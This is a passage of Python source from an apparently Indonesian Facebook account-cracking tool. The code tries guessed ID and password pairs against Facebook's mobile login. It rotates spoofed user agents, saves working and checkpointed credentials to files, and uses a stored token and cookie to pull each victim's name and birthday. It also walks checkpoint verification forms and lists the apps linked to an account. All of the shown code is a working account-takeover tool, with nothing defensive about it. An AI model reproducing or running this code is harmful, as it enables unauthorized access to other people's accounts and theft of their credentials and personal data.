				open('OK/'+okz,'a').write(uiz+'|'+pw+'\n')
				ok+=1
			else:continue
			break
		elif "www.facebook.com" in response.json()["error_msg"]:
			if "no" in tampilkan_ttl:
				print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
				open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
				cp+=1
				break
			elif "ya" in tampilkan_ttl:
				try:
					token = open('token.txt','r').read()
					cookie = open('cookie.txt','r').read()
					coki = {"cookie":cookie}
					xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
					x = json.loads(xn.text)
					ttl = x['birthday']
					nama_ = x["name"]
						#id_ = x["id"]
					print("\r %s*--> %s|%s|%s|%s • %s"%(K,nama_,uiz,pw,ttl,tahun(uiz)))
					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
					break
				except(KeyError, IOError):
					ttl = " "
				except:pass
				print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
				cp+=1
			else:continue
			break
		else:
			continue
	
	HikmatXD +=1


def opsi_detect(uiz,pw):
	global cp
	ua = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	from bs4 import BeautifulSoup as sop
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':uiz,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
		open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print(garis+H+" tap yes/a2f.. cek lagi akunnya login di fb lite ")
		else:
			for opsii in opsi:
				print('\r'+garis+'%s terdapat %s%s '%(P,K,opsii.text))
	except Exception as c:
		print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
		print('\r'+garis+'%s tidak dapat mengecek opsi... cek login di fb lite/mbasic '%(M))
		open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
		cp+=1
		
def cek_apk(ses,kuki):
	w=ses.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":kuki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print('\r'+garis+M+' tidak ada apk aktif yang terkait ')
	else:
		print('\r'+garis+H+' aplikasi yang terkait : ')
		for i in range(len(game)):
			print("\r"+garis+" %s%s. %s%s"%(P,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),P))

	w=ses.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":kuki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print('\r'+garis+M+' tidak ada apk kadaluarsa yang terkait ')
	else:
		print('\r'+garis+K+' aplikasi kadaluarsa yang terkait : ')
		for i in range(len(game)):
			print("\r"+garis+" %s%s. %s%s"%(P,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),P))
		else:
			print('\r') 



cek_cookie()